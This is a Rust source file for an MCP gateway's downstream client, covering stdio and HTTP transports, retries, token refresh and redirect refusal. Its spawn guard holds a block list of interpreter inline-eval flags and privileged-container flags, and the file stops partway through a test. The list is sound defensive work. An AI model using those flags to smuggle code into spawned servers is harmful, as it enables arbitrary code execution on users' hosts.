//! Downstream MCP client.
//!
//! The gateway is an MCP *server* to the AI client, and an MCP *client* to each
//! real server behind it. This module is that client half: it speaks JSON-RPC to
//! one downstream server over a transport, does the handshake, and lists/calls
//! its tools. The transport is abstracted so the router can be tested with a mock
//! instead of spawning real processes.

use std::io::{BufRead, BufReader, Write};
use std::path::Path;
use std::process::{Child, ChildStdin, Command, Stdio};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc::{Receiver, RecvTimeoutError, Sender};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use serde_json::{json, Value};

pub const PROTOCOL_VERSION: &str = "2025-06-18";

/// Max time to wait for a single stdio response before giving up. Without this a
/// server that never replies would block its thread (and the batch health probe)
/// forever.
const STDIO_READ_TIMEOUT: Duration = Duration::from_secs(30);
/// Tighter bound for the connect handshake (initialize + tools/list). The batch
/// probe and every router rebuild connect to all servers and wait on the slowest,
/// so one hung server should fail in seconds, not stall everything for the full
/// live-call timeout. Restored to STDIO_READ_TIMEOUT once connected.
const STDIO_CONNECT_TIMEOUT: Duration = Duration::from_secs(10);
/// Keep at most this many bytes of a child's stderr tail for error reporting.
const STDERR_TAIL_CAP: usize = 4096;

/// Cap on how much of a downstream HTTP/SSE response body we buffer, so a malicious
/// or broken server can't stream gigabytes to exhaust gateway memory. Generous: real
/// MCP responses are tiny.
const MAX_RESPONSE_BYTES: u64 = 16 * 1024 * 1024;

/// Retry budget for transient HTTP failures that are SAFE to repeat: a connection
/// that never reached the server, or an explicit 429 rate-limit. We deliberately
/// do NOT retry 5xx or post-send I/O errors, because an MCP `tools/call` is not
/// guaranteed idempotent and may already have executed server-side, so a blind
/// retry could double-execute it (send the email twice, charge the card twice).
pub(crate) const HTTP_MAX_RETRIES: u32 = 2;
/// Base backoff between retries; doubles each attempt, capped at HTTP_RETRY_CAP.
pub(crate) const HTTP_RETRY_BASE: Duration = Duration::from_millis(250);
pub(crate) const HTTP_RETRY_CAP: Duration = Duration::from_secs(10);


/// Error from a single transport request attempt. The caller (Router) owns the
/// retry loop so it can release the per-server Mutex during the backoff sleep,
/// instead of blocking every other agent queued on the same server.
#[derive(Debug, Clone)]
pub enum TransportError {
    /// Non-retryable: the request was processed (or is structurally invalid).
    Fatal(String),
    /// Retryable: a 429 rate-limit or a connection that never reached the server.
    /// `retry_after` carries the server-advertised delay (Retry-After) if present;
    /// the caller falls back to its own exponential backoff when `None`.
    Retry {
        retry_after: Option<Duration>,
        message: String,
    },
}

impl std::fmt::Display for TransportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            TransportError::Fatal(msg) => write!(f, "{msg}"),
            TransportError::Retry { message, .. } => write!(f, "{message}"),
        }
    }
}

impl From<String> for TransportError {
    fn from(s: String) -> Self {
        TransportError::Fatal(s)
    }
}

/// Read up to `max` bytes of a ureq response body, lossily as text, never more than
/// the cap even if the server keeps streaming.
fn read_capped(resp: ureq::Response, max: u64) -> String {
    use std::io::Read;
    let mut buf = Vec::new();
    let _ = resp.into_reader().take(max).read_to_end(&mut buf);
    String::from_utf8_lossy(&buf).into_owned()
}

/// Exponential backoff for retry `attempt` (0-based): base * 2^attempt, capped.
pub(crate) fn backoff_delay(attempt: u32) -> Duration {
    let mult = 1u32 << attempt.min(6);
    HTTP_RETRY_BASE.saturating_mul(mult).min(HTTP_RETRY_CAP)
}

/// Parse a `Retry-After` value in delta-seconds form (the common 429 form),
/// capped so a hostile or misconfigured server can't park a call for minutes.
fn retry_after_delay(value: &str) -> Option<Duration> {
    value
        .trim()
        .parse::<u64>()
        .ok()
        .map(|s| Duration::from_secs(s).min(HTTP_RETRY_CAP))
}

/// True for transport errors where the request never reached the server (DNS or
/// connection failure), so even a non-idempotent `tools/call` is safe to retry.
/// Post-send I/O errors (e.g. a read timeout after the server got the request)
/// are deliberately excluded, since the call may already have run.
fn is_retryable_transport(t: &ureq::Transport) -> bool {
    matches!(
        t.kind(),
        ureq::ErrorKind::Dns | ureq::ErrorKind::ConnectionFailed
    )
}

/// Build an `Authorization` header value from a raw token, adding the `Bearer`
/// scheme unless the caller already included one.
pub fn bearer_header(token: &str) -> String {
    if token.to_lowercase().starts_with("bearer ") {
        token.to_string()
    } else {
        format!("Bearer {token}")
    }
}

/// Resolve a bare command to a concrete executable.
///
/// On Windows, Node tooling lives in `.cmd` shims (`npx` is really `npx.cmd`),
/// and `Command::new("npx")` won't find it. Search PATH with PATHEXT so bare
/// commands resolve. (Rust 1.77.2+ then runs the resolved `.cmd` via cmd.exe.)
#[cfg(windows)]
pub fn resolve_command(command: &str) -> String {
    let p = Path::new(command);
    if p.extension().is_some() || command.contains('\\') || command.contains('/') {
        return command.to_string();
    }
    let exts = std::env::var("PATHEXT").unwrap_or_else(|_| ".COM;.EXE;.BAT;.CMD".to_string());
    if let Ok(path) = std::env::var("PATH") {
        for dir in path.split(';').filter(|d| !d.is_empty()) {
            for ext in exts.split(';').filter(|e| !e.is_empty()) {
                let candidate = Path::new(dir).join(format!("{command}{ext}"));
                if candidate.is_file() {
                    return candidate.to_string_lossy().into_owned();
                }
            }
        }
    }
    command.to_string()
}

/// A PATH that includes the user's real shell PATH plus common install dirs.
/// macOS GUI apps (and apps they launch, like the client-spawned gateway) inherit
/// only a minimal PATH, so `npx`/`uvx`/`node` aren't found without this. Computed
/// once and cached.
#[cfg(not(windows))]
pub fn augmented_path() -> &'static str {
    use std::sync::OnceLock;
    static CACHED: OnceLock<String> = OnceLock::new();
    CACHED.get_or_init(|| {
        let mut dirs_list: Vec<String> = std::env::var("PATH")
            .ok()
            .map(|p| p.split(':').map(String::from).collect())
            .unwrap_or_default();
        let mut push = |d: String, list: &mut Vec<String>| {
            if !d.is_empty() && !list.iter().any(|x| *x == d) {
                list.push(d);
            }
        };
        // Best effort: the login shell's PATH (covers nvm/asdf/homebrew/volta).
        if let Ok(shell) = std::env::var("SHELL") {
            if let Ok(out) = std::process::Command::new(&shell)
                .args(["-ilc", "printf %s \"$PATH\""])
                .output()
            {
                if out.status.success() {
                    for d in String::from_utf8_lossy(&out.stdout).split(':') {
                        push(d.to_string(), &mut dirs_list);
                    }
                }
            }
        }
        if let Some(home) = dirs::home_dir() {
            for sub in [".local/bin", ".cargo/bin", ".bun/bin"] {
                push(home.join(sub).to_string_lossy().into_owned(), &mut dirs_list);
            }
        }
        for d in ["/usr/local/bin", "/opt/homebrew/bin", "/usr/bin", "/bin"] {
            push(d.to_string(), &mut dirs_list);
        }
        dirs_list.join(":")
    })
}

#[cfg(not(windows))]
pub fn resolve_command(command: &str) -> String {
    if command.contains('/') {
        return command.to_string();
    }
    for dir in augmented_path().split(':').filter(|d| !d.is_empty()) {
        let candidate = Path::new(dir).join(command);
        if candidate.is_file() {
            return candidate.to_string_lossy().into_owned();
        }
    }
    command.to_string()
}

/// A bidirectional JSON-RPC channel to one downstream server.
pub trait Transport: Send {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError>;
    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError>;
    /// Bound how long a single `request` waits for its response. Used to fail the
    /// connect handshake fast. Default no-op: transports with their own fixed
    /// request timeout (e.g. HTTP) ignore it.
    fn set_read_timeout(&mut self, _timeout: Duration) {}
    /// Start reacting to the server's own `notifications/tools/list_changed`.
    /// Called once the connect handshake is done, so a server that announces its
    /// tools during startup doesn't trigger a needless rebuild. Default no-op:
    /// transports without a live notification stream ignore it.
    fn arm_tools_watch(&mut self) {}
}

/// True if `line` is a downstream `notifications/tools/list_changed` message: a
/// JSON-RPC notification (a `method` of that name, no `id`). Lets the stdout drain
/// spot when a server changes its own tool set mid-session.
fn is_list_changed(line: &str) -> bool {
    // Cheap gate: skip the JSON parse for the overwhelming majority of lines
    // (ordinary responses to our requests) that can't be this notification.
    if !line.contains("tools/list_changed") {
        return false;
    }
    serde_json::from_str::<Value>(line.trim())
        .ok()
        .and_then(|v| {
            v.get("method")
                .and_then(|m| m.as_str())
                .map(|m| m == "notifications/tools/list_changed")
        })
        .unwrap_or(false)
}

/// Forward one drained stdout line to the request loop, first flagging `dirty` if
/// the server (once `armed`) announced a tool-list change. Returns false when the
/// receiver is gone (transport closed) so the drain loop can stop.
fn forward_line(
    line: String,
    tx: &Sender<String>,
    dirty: &Option<Arc<AtomicBool>>,
    armed: &Arc<AtomicBool>,
) -> bool {
    if let Some(flag) = dirty {
        if armed.load(Ordering::SeqCst) && is_list_changed(&line) {
            flag.store(true, Ordering::SeqCst);
        }
    }
    tx.send(line).is_ok()
}

/// Spawn-time supply-chain guard. Conduit runs stdio servers as full-privilege
/// host processes, so this is NOT a sandbox; it refuses the specific *smuggling*
/// techniques where a benign-looking launcher (`node`, `docker`, `sh`) is turned
/// into arbitrary code execution or a privileged container by its arguments. The
/// threat is a booby-trapped server config the member did not author (a team-pushed
/// or registry-imported entry) whose command reads as harmless but whose args
/// inject code. High-precision by design: it only trips on interpreter inline-eval
/// / module-preload flags and container-escape flags, none of which a normal
/// `npx` / `uvx` / binary MCP server needs. Returns `Err(reason)` to block the
/// spawn; the reason surfaces to the member.
pub fn screen_spawn_command(command: &str, args: &[String]) -> Result<(), String> {
    let dangerous: Option<&str> = match command_basename(command).as_str() {
        // Interpreters: inline-eval and module-preload execute attacker-supplied
        // code without a script file on disk.
        "node" | "nodejs" | "deno" | "bun" => {
            first_flag(args, &["-e", "--eval", "-p", "--print", "-r", "--require", "--import"])
        }
        "python" | "python2" | "python3" | "pypy" | "pypy3" => first_flag(args, &["-c"]),
        "ruby" => first_flag(args, &["-e"]),
        "perl" => first_flag(args, &["-e"]),
        "php" => first_flag(args, &["-r"]),
        // Shells: `-c <string>` (or `/c` on Windows shells) runs an arbitrary line.
        "sh" | "bash" | "zsh" | "dash" | "ash" | "fish" | "ksh" | "pwsh" | "powershell" => {
            first_flag(args, &["-c", "-command", "/c", "/command"])
        }
        // Container runtimes: privileged mode, capability/device passthrough, and
        // host-namespace sharing escalate past a normal host process (a plain `-v`
        // mount does not, and stays allowed; see container_escape_flag).
        "docker" | "podman" | "nerdctl" => container_escape_flag(args),
        _ => None,
    };
    match dangerous {
        Some(flag) => Err(format!(
            "refusing to launch '{command}': the argument '{flag}' can execute \
             arbitrary code or escape isolation. Conduit blocks inline-eval and \
             privileged-container flags on spawned servers as a supply-chain guard. \
             If this server is yours and you trust it, launch it from a script file \
             or a wrapper binary instead of an inline command."
        )),
        None => Ok(()),
    }
}

/// Lowercased final path segment without its extension, splitting on BOTH `/` and
/// `\` on every OS. `std::path` only treats `\` as a separator on Windows, so a
/// Windows-style path would slip this check on Linux/macOS; doing it by hand keeps
/// the guard (and its tests) platform-independent. `C:\\tools\\Node.EXE` and
/// `/usr/bin/node` both -> `node`.
fn command_basename(command: &str) -> String {
    let last = command.rsplit(['/', '\\']).next().unwrap_or(command);
    // Strip a trailing extension (`.exe`, `.js`, ...) but keep dotless names intact.
    let stem = last
        .rsplit_once('.')
        .map(|(s, _)| s)
        .filter(|s| !s.is_empty())
        .unwrap_or(last);
    stem.to_ascii_lowercase()
}

/// The first arg (returned verbatim for the error) that case-insensitively equals
/// one of `flags`, matching both `-flag` and the `--flag=value` long form.
fn first_flag<'a>(args: &'a [String], flags: &[&str]) -> Option<&'a str> {
    args.iter().find(|a| {
        let al = a.to_ascii_lowercase();
        let head = al.split('=').next().unwrap_or(&al);
        flags.iter().any(|f| head == *f)
    }).map(|a| a.as_str())
}

/// Docker/Podman args that ESCALATE beyond what a normal host process already has:
/// privileged mode, added capabilities, device passthrough, and host-namespace
/// sharing. Plain host mounts (`-v` / `--volume` / `--mount`) are intentionally NOT
/// blocked: Conduit already runs npx/uvx/binary servers with full host-filesystem
/// access, so a docker volume mount is no more dangerous than the servers we run
/// unrestricted, and blocking it would false-positive on legitimate dockerized MCP
/// servers. Namespace flags (`--pid`, `--net`, ...) trip only when their value is
/// `host`, in either `--pid=host` or `--pid host` form (so `--network mynet` is fine).
fn container_escape_flag(args: &[String]) -> Option<&str> {
    for (i, a) in args.iter().enumerate() {
        let al = a.to_ascii_lowercase();
        let head = al.split('=').next().unwrap_or(&al);
        if matches!(head, "--privileged" | "--cap-add" | "--device") {
            return Some(a.as_str());
        }
        if matches!(head, "--pid" | "--ipc" | "--uts" | "--net" | "--network" | "--userns") {
            let val = al
                .split_once('=')
                .map(|(_, v)| v.to_string())
                .or_else(|| args.get(i + 1).map(|v| v.to_ascii_lowercase()));
            if val.as_deref() == Some("host") {
                return Some(a.as_str());
            }
        }
    }
    None
}

/// Talks to a downstream MCP server over its stdio (a spawned child process).
/// Stdout is drained on a background thread into a channel so reads can time out
/// (a blocking `read_line` on an unresponsive child would otherwise hang forever).
pub struct StdioTransport {
    child: Child,
    stdin: ChildStdin,
    rx: Receiver<String>,
    /// Tail of the child's stderr, drained on a background thread. A server that
    /// dies on startup (bad package name, missing API key) explains itself here,
    /// so we can report that instead of a bare "closed the connection".
    stderr: Arc<Mutex<String>>,
    next_id: i64,
    /// How long a single request waits for its response. Lowered during the
    /// connect handshake, then restored for (potentially slow) live tool calls.
    read_timeout: Duration,
    /// Gate shared with the stdout drain: the drain only flags a `dirty` signal
    /// once this is set, so tool-list changes announced during startup are
    /// ignored. Flipped on by `arm_tools_watch` after the handshake.
    armed: Arc<AtomicBool>,
}

impl StdioTransport {
    /// Spawn a downstream server without watching for its tool-list changes.
    /// Used by one-shot callers (the app's health probe and playground) that
    /// don't keep the connection around to react to live notifications.
    pub fn spawn(command: &str, args: &[String], env: &[(String, String)]) -> Result<Self, String> {
        Self::spawn_inner(command, args, env, None)
    }

    /// Like [`spawn`], but flips `dirty` to true whenever the downstream server
    /// emits `notifications/tools/list_changed` (after `arm_tools_watch`). The
    /// gateway watches that flag and rebuilds, so a server changing its own tool
    /// set mid-session reaches the client instead of being silently dropped.
    pub fn spawn_watched(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        dirty: Arc<AtomicBool>,
    ) -> Result<Self, String> {
        Self::spawn_inner(command, args, env, Some(dirty))
    }

    fn spawn_inner(
        command: &str,
        args: &[String],
        env: &[(String, String)],
        dirty: Option<Arc<AtomicBool>>,
    ) -> Result<Self, String> {
        // Supply-chain guard: refuse code-smuggling / container-escape args before
        // we hand the command to the OS. Applies to every spawn path (probe,
        // playground, gateway) so a booby-trapped config never reaches a process.
        screen_spawn_command(command, args)?;
        let resolved = resolve_command(command);
        let mut cmd = Command::new(&resolved);
        cmd.args(args)
            .envs(env.iter().cloned())
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped());
        // Give the child the augmented PATH too, so e.g. `npx` can find `node`.
        #[cfg(not(windows))]
        cmd.env("PATH", augmented_path());
        // CREATE_NO_WINDOW: without it, every stdio server we spawn flashes a
        // console window on Windows (very visible during a probe/refresh, which
        // spawns one per server). The app and the gateway both spawn through here.
        #[cfg(windows)]
        {
            use std::os::windows::process::CommandExt;
            cmd.creation_flags(0x0800_0000);
        }
        let mut child = cmd
            .spawn()
            .map_err(|e| format!("failed to spawn '{command}': {e}"))?;
        let stdin = child.stdin.take().ok_or("no child stdin")?;
        let stdout = child.stdout.take().ok_or("no child stdout")?;
        let stderr = child.stderr.take().ok_or("no child stderr")?;

        // Drain stdout line-by-line on a dedicated thread; the request loop pulls
        // from the channel with a timeout. The thread ends on EOF/read error or
        // when the receiver is dropped (transport closed). `forward_line` also
        // flags `dirty` when an armed server announces a tool-list change.
        let (tx, rx) = std::sync::mpsc::channel();
        let armed = Arc::new(AtomicBool::new(false));
        let drain_armed = Arc::clone(&armed);
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stdout);
            loop {
                let mut line = String::new();
                match reader.read_line(&mut line) {
                    Ok(0) => break,
                    Ok(_) => {
                        if !forward_line(line, &tx, &dirty, &drain_armed) {
                            break;
                        }
                    }
                    Err(_) => break,
                }
            }
        });

        // Drain stderr into a shared buffer, capped so a chatty server can't grow
        // it without bound. We keep the most recent output (where the fatal error
        // usually is).
        let stderr_buf = Arc::new(Mutex::new(String::new()));
        let stderr_writer = Arc::clone(&stderr_buf);
        std::thread::spawn(move || {
            let mut reader = BufReader::new(stderr);
            let mut line = String::new();
            while let Ok(n) = reader.read_line(&mut line) {
                if n == 0 {
                    break;
                }
                if let Ok(mut buf) = stderr_writer.lock() {
                    buf.push_str(&line);
                    if buf.len() > STDERR_TAIL_CAP {
                        let cut = buf.len() - STDERR_TAIL_CAP;
                        buf.drain(..cut);
                    }
                }
                line.clear();
            }
        });

        Ok(StdioTransport {
            child,
            stdin,
            rx,
            stderr: stderr_buf,
            next_id: 1,
            read_timeout: STDIO_READ_TIMEOUT,
            armed,
        })
    }

    /// Build a useful error for when the child's stdout closed (it exited or
    /// crashed). Includes the exit status and the tail of stderr when available -
    /// that is where "package not found" or "missing API key" actually shows up.
    fn closed_error(&mut self) -> String {
        // The child just exited; give its stderr drain a brief moment to flush.
        std::thread::sleep(Duration::from_millis(150));
        let status = self.child.try_wait().ok().flatten();
        let tail = self
            .stderr
            .lock()
            .map(|b| b.trim().to_string())
            .unwrap_or_default();
        let mut msg = String::from("downstream server exited");
        if let Some(code) = status.and_then(|s| s.code()) {
            msg.push_str(&format!(" (status {code})"));
        }
        if tail.is_empty() {
            msg.push_str(" without output. Check the command, args, and any required API keys.");
        } else {
            msg.push_str(":\n");
            msg.push_str(&tail);
        }
        msg
    }
}

impl Transport for StdioTransport {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
        let id = self.next_id;
        self.next_id += 1;
        let msg = json!({ "jsonrpc": "2.0", "id": id, "method": method, "params": params });
        writeln!(self.stdin, "{msg}").map_err(|e| TransportError::Fatal(e.to_string()))?;
        self.stdin.flush().map_err(|e| TransportError::Fatal(e.to_string()))?;

        // Read until the response with our id arrives, skipping notifications.
        // The deadline bounds the whole wait so an unresponsive server fails fast
        // instead of hanging the thread (and the batch probe) indefinitely.
        let deadline = Instant::now() + self.read_timeout;
        loop {
            let remaining = deadline
                .checked_duration_since(Instant::now())
                .unwrap_or_default();
            let line = match self.rx.recv_timeout(remaining) {
                Ok(l) => l,
                Err(RecvTimeoutError::Timeout) => {
                    return Err(TransportError::Fatal(format!("timed out waiting for '{method}' response")))
                }
                Err(RecvTimeoutError::Disconnected) => {
                    return Err(TransportError::Fatal(self.closed_error()))
                }
            };
            let trimmed = line.trim();
            if trimmed.is_empty() {
                continue;
            }
            let value: Value = match serde_json::from_str(trimmed) {
                Ok(v) => v,
                Err(_) => continue,
            };
            if value.get("id").and_then(|i| i.as_i64()) == Some(id) {
                if let Some(err) = value.get("error") {
                    return Err(TransportError::Fatal(err.to_string()));
                }
                return Ok(value.get("result").cloned().unwrap_or(Value::Null));
            }
        }
    }

    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        let msg = json!({ "jsonrpc": "2.0", "method": method, "params": params });
        writeln!(self.stdin, "{msg}").map_err(|e| TransportError::Fatal(e.to_string()))?;
        self.stdin.flush().map_err(|e| TransportError::Fatal(e.to_string()))
    }

    fn set_read_timeout(&mut self, timeout: Duration) {
        self.read_timeout = timeout;
    }

    fn arm_tools_watch(&mut self) {
        self.armed.store(true, Ordering::SeqCst);
    }
}

impl Drop for StdioTransport {
    fn drop(&mut self) {
        let _ = self.child.kill();
        let _ = self.child.wait();
    }
}

/// Normalize a JSON-RPC id (number or string) to a string for comparison.
fn id_key(v: &Value) -> Option<String> {
    match v {
        Value::Number(n) => Some(n.to_string()),
        Value::String(s) => Some(s.clone()),
        _ => None,
    }
}

/// Whether an SSE message's id matches the request id. Tolerant of number-vs-string
/// encoding (some servers echo a numeric id as a string). A `None` wanted id means
/// take the first message (used when we didn't send an id).
fn ids_match(got: Option<&Value>, wanted: Option<&Value>) -> bool {
    match wanted {
        None => true,
        Some(w) => match (id_key(w), got.and_then(id_key)) {
            (Some(a), Some(b)) => a == b,
            _ => false,
        },
    }
}

/// A callback that mints a fresh token on a 401/403 (e.g. an OAuth refresh), so a
/// long-running session recovers from an expired access token instead of failing.
pub type RefreshFn = Box<dyn Fn() -> Option<String> + Send + Sync>;

/// Talks to a remote MCP server over the Streamable HTTP transport: each request
/// is a POST, and the response is either a JSON body or an SSE stream carrying
/// the JSON-RPC message. A session id from `initialize` is echoed on later calls.
pub struct HttpTransport {
    url: String,
    agent: ureq::Agent,
    session_id: Option<String>,
    next_id: i64,
    /// Raw bearer token (without the "Bearer " prefix), if the server needs auth.
    auth: Option<String>,
    /// Called once on a 401/403 to mint a fresh token (an OAuth refresh). Returns
    /// the new raw token; the request is then retried with it. `None` = no refresh
    /// available, so an auth failure surfaces as before. This is what lets a long-
    /// running gateway recover from a short-lived access token expiring mid-session
    /// instead of 401ing until the server is manually reconnected.
    refresh: Option<RefreshFn>,
}

impl HttpTransport {
    pub fn new(url: &str) -> Self {
        Self::with_auth(url, None)
    }

    pub fn with_auth(url: &str, auth: Option<String>) -> Self {
        Self::with_auth_refresh(url, auth, None)
    }

    /// Like `with_auth`, but with a callback invoked once on a 401/403 to mint a
    /// fresh token; the request is retried with whatever it returns.
    pub fn with_auth_refresh(url: &str, auth: Option<String>, refresh: Option<RefreshFn>) -> Self {
        HttpTransport {
            url: url.to_string(),
            agent: ureq::AgentBuilder::new()
                .timeout(std::time::Duration::from_secs(30))
                // Never follow redirects. MCP Streamable HTTP doesn't need cross-host
                // redirects, and following one would let a malicious server bounce us to
                // an internal address (SSRF, e.g. cloud metadata) or replay our
                // Authorization bearer to a host of its choosing (token theft).
                .redirects(0)
                .build(),
            session_id: None,
            next_id: 1,
            auth,
            refresh,
        }
    }

    fn post(&mut self, body: &Value, expect_response: bool) -> Result<Option<Value>, TransportError> {
        let payload = body.to_string();

        // Token refresh is handled internally (it doesn't sleep, so no lock
        // contention). Only 429 and transport-retry signals bubble up as
        // TransportError::Retry so the Router can sleep *outside* the lock.
        let mut refreshed = false;
        let resp = loop {
            let mut req = self
                .agent
                .post(&self.url)
                .set("Content-Type", "application/json")
                .set("Accept", "application/json, text/event-stream")
                .set("MCP-Protocol-Version", PROTOCOL_VERSION);
            if let Some(sid) = &self.session_id {
                req = req.set("Mcp-Session-Id", sid);
            }
            if let Some(token) = &self.auth {
                req = req.set("Authorization", &bearer_header(token));
            }

            match req.send_string(&payload) {
                Ok(r) => break r,
                // Rate limited: return a Retry signal so the Router sleeps
                // *outside* the per-server Mutex.
                Err(ureq::Error::Status(429, r)) => {
                    let retry_after = r.header("retry-after").and_then(retry_after_delay);
                    let _ = read_capped(r, 8 * 1024);
                    return Err(TransportError::Retry {
                        retry_after,
                        message: "HTTP 429: rate limited".to_string(),
                    });
                }
                // The access token likely expired: refresh it once and retry with
                // the new token, so a long-running session self-heals instead of
                // 401ing until the server is manually reconnected.
                Err(ureq::Error::Status(code, r))
                    if (code == 401 || code == 403) && !refreshed && self.refresh.is_some() =>
                {
                    let _ = read_capped(r, 8 * 1024);
                    refreshed = true;
                    match self.refresh.as_ref().and_then(|f| f()) {
                        Some(tok) => {
                            self.auth = Some(tok);
                            continue;
                        }
                        None => {
                            return Err(TransportError::Fatal(format!(
                                "HTTP {code} (needs authentication): token refresh failed"
                            )))
                        }
                    }
                }
                Err(ureq::Error::Status(code, r)) => {
                    let detail: String = read_capped(r, 64 * 1024).chars().take(200).collect();
                    let hint = if code == 401 || code == 403 {
                        " (needs authentication)"
                    } else {
                        ""
                    };
                    return Err(TransportError::Fatal(format!("HTTP {code}{hint}: {detail}")));
                }
                // Transport error (DNS / connection failure): retryable, but
                // the Router owns the backoff sleep so the Mutex is released.
                Err(ureq::Error::Transport(t)) if is_retryable_transport(&t) => {
                    return Err(TransportError::Retry {
                        retry_after: None,
                        message: format!("transport error (retryable): {t}"),
                    });
                }
                Err(e) => return Err(TransportError::Fatal(e.to_string())),
            }
        };

        if let Some(sid) = resp.header("Mcp-Session-Id") {
            self.session_id = Some(sid.to_string());
        }
        if !expect_response {
            return Ok(None);
        }

        let is_sse = resp
            .header("content-type")
            .map(|c| c.to_lowercase().contains("text/event-stream"))
            .unwrap_or(false);
        let wanted = body.get("id").cloned();
        let text = read_capped(resp, MAX_RESPONSE_BYTES);

        if is_sse {
            for line in text.lines() {
                let line = line.trim_start();
                if let Some(data) = line.strip_prefix("data:") {
                    let data = data.trim();
                    if data.is_empty() {
                        continue;
                    }
                    if let Ok(v) = serde_json::from_str::<Value>(data) {
                        if ids_match(v.get("id"), wanted.as_ref()) {
                            return Ok(Some(v));
                        }
                    }
                }
            }
            Err(TransportError::Fatal("no matching message in SSE stream".to_string()))
        } else {
            serde_json::from_str(&text)
                .map(Some)
                .map_err(|e| TransportError::Fatal(format!("bad JSON response: {e}")))
        }
    }
}

impl Transport for HttpTransport {
    fn request(&mut self, method: &str, params: Value) -> Result<Value, TransportError> {
        let id = self.next_id;
        self.next_id += 1;
        let body = json!({ "jsonrpc": "2.0", "id": id, "method": method, "params": params });
        let resp = self.post(&body, true)?.ok_or_else(|| TransportError::Fatal("empty response".to_string()))?;
        if let Some(err) = resp.get("error") {
            return Err(TransportError::Fatal(err.to_string()));
        }
        Ok(resp.get("result").cloned().unwrap_or(Value::Null))
    }

    fn notify(&mut self, method: &str, params: Value) -> Result<(), TransportError> {
        let body = json!({ "jsonrpc": "2.0", "method": method, "params": params });
        self.post(&body, false)?;
        Ok(())
    }
}

/// One connected downstream server: its id, its transport, and its cached
/// tools, resources, and prompts.
pub struct DownstreamServer {
    pub id: String,
    transport: Box<dyn Transport>,
    pub tools: Vec<Value>,
    pub resources: Vec<Value>,
    pub prompts: Vec<Value>,
    /// Whether the server's `initialize` advertised resources / prompts. The
    /// actual lists are fetched lazily via `load_resources_prompts`.
    caps_resources: bool,
    caps_prompts: bool,
}

impl DownstreamServer {
    /// Handshake with the server and fetch its tool list. Resources and prompts
    /// are NOT fetched here - only whether the server advertises them is noted,
    /// so the health probe (which connects to every server in one batch) stays
    /// tools-only and fast and can't stall on a slow or hanging resources/prompts
    /// endpoint. The gateway calls `load_resources_prompts` to populate them.
    pub fn connect(id: String, mut transport: Box<dyn Transport>) -> Result<Self, String> {
        // Fail the handshake fast so one unresponsive server can't stall the whole
        // batch probe / router rebuild for the full live-call timeout.
        transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        let init = transport.request(
            "initialize",
            json!({
                "protocolVersion": PROTOCOL_VERSION,
                "capabilities": {},
                "clientInfo": { "name": "conduit-gateway", "version": env!("CARGO_PKG_VERSION") }
            }),
        ).map_err(|e| e.to_string())?;
        let caps = init.get("capabilities");
        let caps_resources = caps.and_then(|c| c.get("resources")).is_some();
        let caps_prompts = caps.and_then(|c| c.get("prompts")).is_some();
        transport.notify("notifications/initialized", json!({})).map_err(|e| e.to_string())?;

        let result = transport.request("tools/list", json!({})).map_err(|e| e.to_string())?;
        let tools = extract_array(&result, "tools");

        // Restore the longer timeout: actual tool calls can legitimately be slow.
        transport.set_read_timeout(STDIO_READ_TIMEOUT);
        // Handshake done: from here on, react to the server's own tool-list
        // changes (ignored until now so a startup announcement is a no-op).
        transport.arm_tools_watch();

        Ok(DownstreamServer {
            id,
            transport,
            tools,
            resources: Vec::new(),
            prompts: Vec::new(),
            caps_resources,
            caps_prompts,
        })
    }

    /// Re-fetch the server's tool list on the existing connection, after it
    /// announced a `tools/list_changed`. Bounds the wait like the handshake so a
    /// hung server can't stall the refresh; on error the previous list is kept.
    pub fn refresh_tools(&mut self) {
        self.transport.set_read_timeout(STDIO_CONNECT_TIMEOUT);
        if let Ok(result) = self.transport.request("tools/list", json!({})) {
            self.tools = extract_array(&result, "tools");
        }
        self.transport.set_read_timeout(STDIO_READ_TIMEOUT);
    }

    /// Fetch the resources and prompts the server advertised. Best-effort: an
    /// error or empty response just leaves the list empty. Kept out of `connect`
    /// so only the gateway (which actually proxies these) pays the cost.
    pub fn load_resources_prompts(&mut self) {
        if self.caps_resources {
            if let Ok(r) = self.transport.request("resources/list", json!({})) {
                self.resources = extract_array(&r, "resources");
            }
        }
        if self.caps_prompts {
            if let Ok(r) = self.transport.request("prompts/list", json!({})) {
                self.prompts = extract_array(&r, "prompts");
            }
        }
    }

    pub fn call(&mut self, tool: &str, arguments: Value) -> Result<Value, TransportError> {
        self.transport
            .request("tools/call", json!({ "name": tool, "arguments": arguments }))
    }

    /// Read one resource by its (original, downstream) uri.
    pub fn read_resource(&mut self, uri: &str) -> Result<Value, TransportError> {
        self.transport
            .request("resources/read", json!({ "uri": uri }))
    }

    /// Get one prompt by its (original, downstream) name.
    pub fn get_prompt(&mut self, name: &str, arguments: Value) -> Result<Value, TransportError> {
        self.transport
            .request("prompts/get", json!({ "name": name, "arguments": arguments }))
    }
}

/// Pull a named array field out of a JSON-RPC result, or an empty vec.
fn extract_array(result: &Value, key: &str) -> Vec<Value> {
    result
        .get(key)
        .and_then(|v| v.as_array())
        .cloned()
        .unwrap_or_default()
}

#[cfg(test)]
mod tests {
    use super::{resolve_command, screen_spawn_command};

    #[test]
    fn paths_with_extension_pass_through() {
        assert_eq!(resolve_command("C:\\tools\\foo.exe"), "C:\\tools\\foo.exe");
    }

    fn argv(parts: &[&str]) -> Vec<String> {
        parts.iter().map(|s| s.to_string()).collect()
    }

    #[test]
    fn spawn_guard_allows_normal_mcp_launchers() {
        // The overwhelmingly common launchers must never be blocked.
        assert!(screen_spawn_command("npx", &argv(&["-y", "@some/mcp-server"])).is_ok());
        assert!(screen_spawn_command("uvx", &argv(&["some-mcp-server"])).is_ok());
        assert!(screen_spawn_command("node", &argv(&["server.js", "--port", "3000"])).is_ok());
        assert!(screen_spawn_command("python", &argv(&["-m", "my_server"])).is_ok());
        assert!(screen_spawn_command("python3", &argv(&["/opt/app/main.py"])).is_ok());
        // A docker server without escape flags is fine.
